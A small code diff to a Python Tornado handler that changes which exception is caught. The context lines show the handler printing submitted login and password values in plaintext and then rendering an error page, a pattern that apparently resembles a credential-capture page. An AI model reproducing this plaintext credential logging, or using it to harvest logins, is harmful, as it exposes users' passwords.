@@ -25,7 +25,7 @@ class MainHandler(tornado.web.RequestHandler):
         try:
             print("login > " + self.get_argument("login"))
             print("password > " + self.get_argument("password"))
-        except tornado.web.MissingArgumentError:
+        except tornado.web.HTTPError:
             print("\n")
         # @TODO reload the same page or an error one or something else ...
         self.render("pages/" + pagePath + "error.html")
